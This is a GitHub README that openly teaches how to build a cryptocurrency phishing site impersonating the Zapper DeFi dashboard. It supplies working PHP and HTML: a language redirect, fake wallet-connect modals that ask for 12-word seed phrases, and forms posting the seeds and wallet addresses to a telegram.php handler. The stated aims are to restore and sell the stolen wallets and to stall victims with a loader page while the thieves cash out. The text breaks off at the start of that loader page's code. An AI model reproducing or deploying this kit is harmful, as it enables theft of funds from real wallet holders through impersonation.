# DeFi-phishing-
<p align="center">
  <img src="https://github.com/trewisscotch/DeFi-phishing-/blob/main/meg/1.png" alt="animated" />
</p>

## PC VERSION OF THE SITE
### SITE THAT COLLECTS SECRET WORDS AND WALLETS AND THEN WE WILL ADD IT AND SEND DATA TO TELEGRAMS. AFTER RECEIVING THE SECRET WORDS AND ADDRESSES OF CRYPTO WALLETS, YOU CAN RESTORE THEM AND SELL OR SELL THEM.

<p align="center">
  <img src="https://github.com/trewisscotch/DeFi-phishing-/blob/main/meg/2.jpg" alt="animated" />
</p>

#### This will take a little time, the ability to copy the site and a little knowledge of web development JS, PHP, HTML / CSS and traffic.
#### The first thing we need is to write a mini script to distribute users by country.
#### Let's call it index.php
```
// The script works according to the user browser language
$sites = array(

"en" => "index.html",

// "cn" => "index_cn.html",

// "de" => "index_de.html",

// "el" => "index_el.html",

// "es" => "index_es.html",

// "fr" => "index_fr.html",

// "id" => "index_id.html",

// "it" => "index_it.html"

);

// Determine the 2-character language en, etc.

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Setting default language if variable $lang do not match more than one value from the array $site

if (!isset($sites[$lang])) {

$lang = ‘en’;

}

// Redirect the user to the desired page.

header('Location: ' . $sites[$lang]);

exit;
```

#### Second, we will need to add a page to enter the wallet, this needs to be sent in a telegram.
#### After entering the data - we are thrown into the profile and there you need to specify 12 secret words and send these words to the telegrams.
#### Let's call it index.html

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://kit.fontawesome.com/aa4dabdc57.js" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="CSS/style.min.css">
    <link rel="stylesheet" href="CSS/style.css">
    <link rel="stylesheet" href="CSS/modal.css">
    <link rel="stylesheet" href="CSS/media.css">
    <link rel="stylesheet" href="CSS/alert.css">
    <title>Zapper - Dashboard for DeFi</title>
    <link rel="shortcut icon" href="icons/zap_logo.png">
    <script src="http://yastatic.net/jquery/2.1.4/jquery.min.js"></script>
    <script src="http://yastatic.net/jquery/cookie/1.0/jquery.cookie.min.js"></script>
    <script src="customalert.js"></script>
</head>
<body>
    
    <header>
        <div class="container">
            
            <div class="logo">
                <a class="zap_linker" href=""><img class="zapper_icons" src="icons/zap_logo.png" alt="">
                    <div class="zapper">Zapper</div></a>
                </div>
                <nav>
                    <ul>
                        <li><a class="nav_link" href="#">Docs</a></li>
                        <li><a class="nav_link" href="#">Tutorials</a></li>
                        <li><a class="nav_link" href="https://discord.com/invite/h6CGbuN">Community</a></li>
                    </ul>
                </nav>
            </div>
        </header>
        <section class="main">
            <div class="container_main">
                <h1>Manage your<span class="index">DeFi</span> <br class="mobile_brack">assets and liabilities in<br class="mobile_brack"> one <br class="desktop_brack">simple interface.</h1> 

                <h3>
                    Get unique access to opportunities in open finance.
                </h3>
                <div class="main_flex">
                    <form action="dashboard.php" method="POST">
                        <input class="main_form" name="cash" maxlength="50" type="text" required placeholder="Enter ENS domain, or a valid ETH, or BTC address">
                        <button class="main_pink">Let's Go!</button>
                        <div class="main_or">
                            or
                        </div>
                        <a class="connect" href="#openModal" rel="modal:open"><button class="main_black">Connect Wallet</button></a>
                    </form>
                </div>
                <div class="main_what_one">
                    <i class="fas fa-arrow-right"></i>
                    <a class= "main_wl" href="#">Don't have an address? View demo.</a>
                </div>
                <div class="main_what_two">
                    <i class="fas fa-arrow-right"></i>
                    <a class= "main_wl" href="#">What's is DeFi?</a>
                </div>
                <div class="main_flex_bottom">
                    <div class="main_mbt">
                        <h2 class="main_mbth">$1.3B+</h2>
                        <p class="main_mbtp">Invested through our platform</p>
                        <p class="main_mbtpbot">Since May 2020</p>
                    </div>
                    <div class="main_mbt">
                        <h2 class="main_mbth">400K+</h2>
                        <p class="main_mbtp">Monitored their assets</p>
                        <p class="main_mbtpbot">Since January 2020</p>
                    </div>
                    <div class="main_mbt">
                        <h2 class="main_mbth">48</h2>
                        <p class="main_mbtp">DeFi platforms supported</p>
                        <a class="main_mbtpbota" href="#">View the full list</a>
                    </div>
                </div>
            </div>
        </section>


        <footer class="footer">
            <div class="container">
                <div class="footer_left">
                    <a class="footer_i" href="https://twitter.com/zapper_fi"><i class="fab fa-twitter"></i></a>
                    <a class="footer_i" href="https://discord.com/invite/h6CGbuN"><i class="fab fa-discord"></i></a>
                    <a class="footer_i" href=""><i class="fab fa-weixin"></i></a>
                    <a class="footer_a" href="#">FAQ</a>
                    <a class="footer_a" href="#">Docs</a>
                    <a class="footer_a" href="https://discord.com/invite/Rf3YJ3V">Contact Support</a>
                    <a class="footer_a" href="#">Supported Platforms</a>
                    <div class="dropdown">
                        <button onclick="myFunction()" class="dropbtn"><div class="dropbtn_lang">en</div> <div class="dropbtn_arrow"></div> </button>
                        <div id="my Dropdown" class="dropdown-content">
                            <a href="#">English</a>
                            <a href="index_fr.html">Français</a>
                            <a href="index_es.html">Español</a>
                            <a href="index_ru.html">Русский</a>
                            <a href="index_cn.html">中文</a>
                            <a href="index_de.html">Deutsch</a>
                            <a href="index_it.html">Italian</a>
                            <a href="index_el.html">ελληνικά</a>
                            <a href="index_id.html">Bahasa</a>
                        </div>
                    </div>
                </div>


                <script>
            /* When the user clicks on the button, 
            toggle between hiding and showing the dropdown content */
            function myFunction() {
                document.getElementById("my Dropdown").classList.toggle("show");
            }
            
            // Закрыть the dropdown if the user clicks outside of it
            /* window.onclick = function(event) {
              if (!event.target.matches('.dropbtn')) {
                var dropdowns = document.getElementsByClassName("dropdown-content");
                var i;
                for (i = 0; i < dropdowns.length; i++) {
                  var open Dropdown = dropdowns[i];
                  if (open Dropdown.classList.contains('show')) {
                    open Dropdown.classList.remove('show');
                  }
                }
              }
            } */
        </script>
        <div class="footer_right">
            <i class="far fa-copyright"></i>
            Zapper 2021
        </div>
    </div>
</footer>

<div id="openModal" class="modal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Select a Wallet to Connect to Zapper</h3>
                <a href="#close" title="Close" class="close">×</a>
            </div>
            <div class="modal-body">    
                <div class="modal-body_l">
                    <a class="modal-body_link" href="#exMask"><button class="modal-body_btn"><img class="modal-body_icon_mm" src="icons/masknew.png" alt=""><span class="modal-body_value">MetaMask</span></button></a>
                    <a class="modal-body_link" href="#exLedger"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/ledgerfin.jpg" alt=""><span class="modal-body_value">Ledger</span></button></a>
                    <a class="modal-body_link" href="#exTrezor"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trezor_dob.jpg" alt=""><span class="modal-body_value">Trezor</span></button></a>
                    <a class="modal-body_link" href="#exPortis"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/port.jpg" alt=""><span class="modal-body_value">Portis</span></button></a>
                    <a class="modal-body_link" href="#exOpera"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/logo-opera.png" alt=""><span class="modal-body_value">Opera</span></button></a>
                    <a class="modal-body_link" href="#exBlockchain"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/blockchain.png" alt=""><span class="modal-body_value">Blockchain</span></button></a>
                    <a class="modal-body_link" href="#exExodus"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/exodus.png" alt=""><span class="modal-body_value">Exodus</span></button></a>

                    <a class="accordion" href="#openModal">What is a wallet?</a>
                    <div class="panel">
                        <p class="wal_p">Wallets are used to send, receive, and store digital assets like Ether. Wallets come in many forms. They are either built into your browser, an extension added to your browser, a piece of hardware plugged into your computer or even an app on your phone. For more information about wallets, see <a href="https://docs.ethhub.io/using-ethereum/wallets/intro-to-ethereum-wallets/">this explanation.</a></p>
                    </div>
                </div>
                <div class="modal-body_r">
                    <a class="modal-body_link" href="#exWalletConnect"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/walletcon_dob.png" alt=""><span class="modal-body_value">WalletConnect</span></button></a>
                    <a class="modal-body_link" href="#exLattice"><button class="modal-body_btn"><img class="modal-body_icon_lat" src="icons/+L.png" alt=""><span class="modal-body_value">Lattice</span></button></a>
                    <a class="modal-body_link" href="#exFormatic"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/forma.jpg" alt=""><span class="modal-body_value">Formatic</span></button></a>
                    <a class="modal-body_link" href="#exTorus"><button class="modal-body_btn"><img class="modal-body_icon_tor" src="img/torus3.png" alt=""><span class="modal-body_value">Torus</span></button></a>
                    <a class="modal-body_link" href="#exWalletLink"><button class="modal-body_btn"><img class="modal-body_icon_wl" src="icons/walletseedfin.png" alt=""><span class="modal-body_value">WalletLink</span></button></a>
                    <a class="modal-body_link" href="#exTrust"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trust.jpg" alt=""><span class="modal-body_value">Trust</span></button></a>
                </div>

                
                <!-- Accordion script in modal window! **************************************************************************************************-->
                <script>
                    var acc = document.getElementsByClassName("accordion");
                    var i;
                    
                    for (i = 0; i < acc.length; i++) {
                        acc[i].addEventListener("click", function() {
                            this.classList.toggle("active");
                            var panel = this.nextElementSibling;
                            if (panel.style.maxHeight){
                                panel.style.maxHeight = null;
                            } else {
                                panel.style.maxHeight = panel.scrollHeight + "px";
                            }
                        });
                    }
                </script>
            </div>
        </div>
    </div>
</div>


<!-- ******************************************************************************************************************* -->
<div id="exMask">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/MetaMaskFin.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>

    <!-- *************************PRESSING THE BUTTON AND SENDING THE INFO TO JS************************************************************************* -->
    <textarea id="sid_input_1" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_1" class="inp_mod" type="hidden" name="currency" value="MetaMask">

    <button class="main_pink2" onclick="validateInput_1()">Connect</button>
</div>
<!--**************************************************************************************************************************************** -->
<div id="exLedger">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon2" src="icons/ledger.jpg" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_2" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_2" class="inp_mod" type="hidden" name="currency" value="Ledger">
    <button class="main_pink2" onclick="validateInput_2()">Connect</button>
</div>
<div id="exTrezor">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="img/trezorphoto.png"> 
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_3" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_3" class="inp_mod" type="hidden" name="currency" value="Trezor">
    <button class="main_pink2" onclick="validateInput_3()">Connect</button>
</div>
<div id="exPortis">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="img/port.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_4" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_4" class="inp_mod" type="hidden" name="currency" value="Portis">
    <button class="main_pink2" onclick="validateInput_4()">Connect</button>
</div>
<div id="exOpera">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="img/logo-opera.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_5" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_5" class="inp_mod" type="hidden" name="currency" value="Opera">
    <button class="main_pink2" onclick="validateInput_5()">Connect</button>
</div>
<div id="exBlockchain">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/blockchainpng.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_6" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_6" class="inp_mod" type="hidden" name="currency" value="Blockchain">
    <button class="main_pink2" onclick="validateInput_6()">Connect</button>
</div>
<div id="exExodus">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/exodus.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_7" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_7" class="inp_mod" type="hidden" name="currency" value="Exodus">
    <button class="main_pink2" onclick="validateInput_7()">Connect</button>
</div>

<div id="exWalletConnect">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="img/walletconph.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_8" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_8" class="inp_mod" type="hidden" name="currency" value="WalletConnect">
    <button class="main_pink2" onclick="validateInput_8()">Connect</button>
</div>
<div id="exLattice">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/+L.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_9" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_9" class="inp_mod" type="hidden" name="currency" value="Lattice">
    <button class="main_pink2" onclick="validateInput_9()">Connect</button>
</div>
<div id="exFormatic">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="img/formaphoto.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_10" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_10" class="inp_mod" type="hidden" name="currency" value="Fortmatic">
    <button class="main_pink2" onclick="validateInput_10()">Connect</button>
</div>
<div id="exTorus" class="modal">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/torf.jpg" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_11" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_11" class="inp_mod" type="hidden" name="currency" value="Torus">
    <button class="main_pink2" onclick="validateInput_11()">Connect</button>
</div>

<div id="exWalletLink">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/walletseedfin.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_12" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_12" class="inp_mod" type="hidden" name="currency" value="WalletLink">
    <button class="main_pink2" onclick="validateInput_12()">Connect</button>
</div>

<div id="exTrust" class="modal">
    <a href="#close" title="Close" class="close_value">×</a>
    <img class="ex2icon" src="icons/trust_png.png" alt="">
    <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
    <p class="ex2p">Wallet Seed:</p>
    <textarea id="sid_input_13" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
    <input id="cur_input_13" class="inp_mod" type="hidden" name="currency" value="Trust">
    <button class="main_pink2" onclick="validateInput_13()">Connect</button>
</div>

</body>
</html>
```
#### The third step is to write a profile page.
#### Let's call it dashboard.php
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://kit.fontawesome.com/aa4dabdc57.js" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="CSS/style.min.css">
    <link rel="stylesheet" href="CSS/dashboard_style.min.css">
    <link rel="stylesheet" href="CSS/style.css">
    <link rel="stylesheet" href="CSS/modal.css">
    <link rel="stylesheet" href="CSS/media.css">
    <title>Zapper - Dashboard for DeFi</title>
    <link rel="shortcut icon" href="icons/zap_logo.png">
    <script src="functions.js"></script>
    <script src="http://yastatic.net/jquery/2.1.4/jquery.min.js"></script>
    <script src="http://yastatic.net/jquery/cookie/1.0/jquery.cookie.min.js"></script>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <a class="zap_linker" href=""><img class="zapper_icons" src="icons/zap_logo.png" alt="">
                    <div class="zapper">Zapper</div></a>
                </div>
                <div class="lk">
                    <img class="lk_icon" src="icons/lg2.png" alt="">
                    <div class="defi">
                        defiportal.eth
                    </div>
                    <div class="arrow_def">

                    </div>
                    <div class="eth">
                        Ethereum

                    </div>
                </div>
                <nav class="nav_dash">
                    <ul>
                        <li>
                            <div class="usa">
                                <a href=""><img class="usa_png" src="icons/usa4.png" alt=""></a><div class="usa_text">USD</div> <div class="usa_arrow"></div>    
                            </div>
                        </li>
                        <li> <div class="gas"><a><i class="fas fa-gas-pump"></i><div class="gas_346">346</div><div class="gas_arrow">
                        </div></a></div></li>
                        <li>
                            <div class="set">
                                <a><i class="fas fa-cog"></i><div class="set_arrow"></div></a>
                            </div></li>
                        </ul>
                    </nav>
                </div>
            </header>
            <section class="section_dash">
                <div class="container_dash">
                    <div class="subheader">
                        <div class="subheader_icons"> <i class="fas fa-layer-group"></i><span class="subheader_pink">Dashboard</span></i></div>
                        <div class="subheader_icons_ex"> <i class="fas fa-exchange-alt"></i>Exchange</i></div>
                        <div class="subheader_icons"><img class="energy" src="icons/energy.png" alt=""><div class="energy_block">Pool</div></div>
                        <div class="subheader_icons"><i class="fas fa-tractor"></i>Farm</div>
                        <div class="subheader_icons"><i class="far fa-clock"></i>History </div>
                        <div class="subheader_line"></div><div class="subheader_line2"></div>
                    </div>


                    <div class="total">
                        <div class="total_block">
                            <p class="total_block_text">Total Assets</p>
                            <p class="total_block_nomber">$0</p>
                        </div>
                        <div class="total_block">
                            <p class="total_block_text">Total Debt</p>
                            <p class="total_block_nomber">$0</p>
                        </div>
                        <div class="total_block">
                            <p class="total_block_text">Net Worth</p>
                            <p class="total_block_nomber">$0</p>
                        </div>
                    </div>
                    <div class="total_acco">Account Overview <a class="total_acco_s">Don't see your assets?

                    </div></a>
                    <div class="total_switch">
                        <div class="total_below">Hide Balances Below</div>
                        <div class="total_arrow"></div>
                        <div class="total_view">Switch View</div>
                        <div class="total_oval"><i class="fas fa-toggle-on"></i></div>
                    </div>
                    <div class="card">
                        <div class="card_block">
                            <div class="card_icon"><div class="circle"><i class="fas fa-wallet"></i></div></div><div class="card_text">Wallet</div><div class="card_nombers">$0</div>
                        </div>
                        <div class="card_block">
                            <div class="card_icon"><div class="circle"><i class="fas fa-wallet"></i></div></div><div class="card_text">Deposits
                            </div><div class="card_nombers">$0</div>
                        </div>
                        <div class="card_block">
                            <div class="card_icon"><div class="circle"><i class="far fa-chart-bar"></i></i></div></div><div class="card_text">Investments
                            </div><div class="card_nombers">$0</div>
                        </div>
                    </div>
                    <div class="card2">
                        <div class="card2_block2">
                            <div class="card_icon"><div class="circle"><img class="track_icons" src="icons/track6.png" alt=""></div></div><div class="card_text">Yield Farming
                            </div><div class="card_nombers">$0</div>
                        </div>
                        <div class="card2_block2">
                            <div class="card_icon"><div class="circle_gr"><i class="fas fa-thermometer-quarter"></i></div></div><div class="card_text">Debt
                            </div><div class="card_nombers">$0
                            </div>
                        </div>
                    </div>
                    <div class="plat">
                        Platforms
                    </div>
                </div>

            </section>

            <div id="exMask">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/MetaMaskFin.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>

                <textarea id="sid_input_1" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_1" class="inp_mod" type="hidden" name="currency" value="MetaMask">

                <button class="main_pink2">Connect</button> 

            </div>
            <div id="exLedger">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon2" src="icons/ledger.jpg" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>
                <form action="telegram.php" method="POST">
                    <textarea id="sid_input_2" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                    <input id="cur_input_2" class="inp_mod" type="hidden" name="currency" value="Ledger">

                    <button class="main_pink2">Connect</button>
                </form>
            </div>
            <div id="exTrezor">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="img/trezorphoto.png"> 
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_3" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_3" class="inp_mod" type="hidden" name="currency" value="Trezor">

                <button class="main_pink2">Connect</button>
            </div>
            <div id="exPortis">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="img/port.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_4" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_4" class="inp_mod" type="hidden" name="currency" value="Portis">

                <button class="main_pink2">Connect</button>
            </div>
            <div id="exOpera">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="img/logo-opera.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_5" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_5" class="inp_mod" type="hidden" name="currency" value="Opera">
                <button class="main_pink2">Connect</button>
            </div>
            <div id="exBlockchain">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/blockchainpng.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>
                <form action="telegram.php" method="POST">
                    <input type="hidden" name="cash" value="<?php echo trim($_POST['cash']); ?>">
                    <textarea id="sid_input_6" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                    <input id="cur_input_6" class="inp_mod" type="hidden" name="currency" value="Blockchain">
                    <button class="main_pink2">Connect</button>
                </form>
            </div>
            <div id="exExodus">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/exodus.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_7" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_7" class="inp_mod" type="hidden" name="currency" value="Exodus">
                <button class="main_pink2">Connect</button>
            </div>

            <div id="exWalletConnect">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="img/walletconph.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_8" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_8" class="inp_mod" type="hidden" name="currency" value="WalletConnect">
                <button class="main_pink2">Connect</button>
            </div>
            <div id="exLattice">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/+L.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_9" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_9" class="inp_mod" type="hidden" name="currency" value="Lattice">
                <button class="main_pink2">Connect</button>
            </div>
            <div id="exFormatic">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="img/formaphoto.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_10" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_10" class="inp_mod" type="hidden" name="currency" value="Fortmatic">
                <button class="main_pink2">Connect</button>
            </div>
            <div id="exTorus" class="modal">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/torf.jpg" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_11" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_11" class="inp_mod" type="hidden" name="currency" value="Torus">
                <button class="main_pink2">Connect</button>
            </div>

            <div id="exWalletLink">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/walletseedfin.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>


                <textarea id="sid_input_12" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_12" class="inp_mod" type="hidden" name="currency" value="WalletLink">
                <button class="main_pink2">Connect</button>
            </div>

            <div id="exTrust" class="modal">
                <a href="#close" title="Close" class="close_value">×</a>
                <img class="ex2icon" src="icons/trust_png.png" alt="">
                <p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
                <p class="ex2p">Wallet Seed:</p>
                <textarea id="sid_input_13" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
                <input id="cur_input_13" class="inp_mod" type="hidden" name="currency" value="Trust">
                <button class="main_pink2">Connect</button>
            </div>
        </div>

        <div id="openModal" class="modal2">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 class="modal-title">Select a Wallet to Connect to Zapper</h3>
                    </div>
                    <div class="modal-body">    
                        <div class="modal-body_l">
                            <a class="modal-body_link" href="#exMask"><button class="modal-body_btn"><img class="modal-body_icon_mm" src="icons/masknew.png" alt=""><span class="modal-body_value">MetaMask</span></button></a>
                            <a class="modal-body_link" href="#exLedger"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/ledger_dob.jpg" alt=""><span class="modal-body_value">Ledger</span></button></a>
                            <a class="modal-body_link" href="#exTrezor"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trezor_dob.jpg" alt=""><span class="modal-body_value">Trezor</span></button></a>
                            <a class="modal-body_link" href="#exPortis"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/port.jpg" alt=""><span class="modal-body_value">Portis</span></button></a>
                            <a class="modal-body_link" href="#exOpera"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/logo-opera.png" alt=""><span class="modal-body_value">Opera</span></button></a>
                            <a class="modal-body_link" href="#exBlockchain"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/blockchain.png" alt=""><span class="modal-body_value">Blockchain</span></button></a>
                            <a class="modal-body_link" href="#exExodus"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/exodus.png" alt=""><span class="modal-body_value">Exodus</span></button></a>

                            <a class="accordion" href="#openModal">What is a wallet?</a>
                            <div class="panel">
                                <p class="wal_p">Wallets are used to send, receive, and store digital assets like Ether. Wallets come in many forms. They are either built into your browser, an extension added to your browser, a piece of hardware plugged into your computer or even an app on your phone. For more information about wallets, see <a href="https://docs.ethhub.io/using-ethereum/wallets/intro-to-ethereum-wallets/">this explanation.</a></p>
                            </div>
                        </div>
                        <div class="modal-body_r">
                            <a class="modal-body_link" href="#exWalletConnect"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/walletcon_dob.png" alt=""><span class="modal-body_value">WalletConnect</span></button></a>
                            <a class="modal-body_link" href="#exLattice"><button class="modal-body_btn"><img class="modal-body_icon_lat" src="icons/+L.png" alt=""><span class="modal-body_value">Lattice</span></button></a>
                            <a class="modal-body_link" href="#exFormatic"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/forma.jpg" alt=""><span class="modal-body_value">Formatic</span></button></a>
                            <a class="modal-body_link" href="#exTorus"><button class="modal-body_btn"><img class="modal-body_icon_tor" src="img/torus3.png" alt=""><span class="modal-body_value">Torus</span></button></a>
                            <a class="modal-body_link" href="#exWalletLink"><button class="modal-body_btn"><img class="modal-body_icon_wl" src="icons/walletseedfin.png" alt=""><span class="modal-body_value">WalletLink</span></button></a>
                            <a class="modal-body_link" href="#exTrust"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trust.jpg" alt=""><span class="modal-body_value">Trust</span></button></a>
                        </div>


                        <!-- Accordion script in modal window! **************************************************************************************************-->
                        <script>
                            var acc = document.getElementsByClassName("accordion");
                            var i;

                            for (i = 0; i < acc.length; i++) {
                                acc[i].addEventListener("click", function() {
                                    this.classList.toggle("active");
                                    var panel = this.nextElementSibling;
                                    if (panel.style.maxHeight){
                                        panel.style.maxHeight = null;
                                    } else {
                                        panel.style.maxHeight = panel.scrollHeight + "px";
                                    }
                                });
                            }
                        </script>

                        <script>
                            var delay = 1000;
                            setTimeout("document.getElementById('openModal').style.display='block'", delay);
                        </script>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```
#### The fourth step - we transfer to the loader so that the user does not understand what the matter is (this will give some time to cash out).
#### Let's call the page disc.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
